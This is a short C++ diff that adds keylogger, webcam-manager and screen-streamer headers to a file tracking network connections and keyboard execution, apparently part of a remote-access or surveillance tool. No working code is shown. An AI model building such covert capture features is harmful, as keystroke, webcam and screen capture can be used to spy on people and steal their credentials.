@@ -18,6 +18,9 @@
 #include "KeyboardExecuter.h"
 #include "ConnectionState.h"
 #include "SystemState.h"
+#include "KeyLogger.h"
+#include "WebcamManager.h"
+#include "ScreenStreamer.h"
 
 std::map<std::string, std::shared_ptr<Stream>> connections;
 std::mutex connections_mutex;
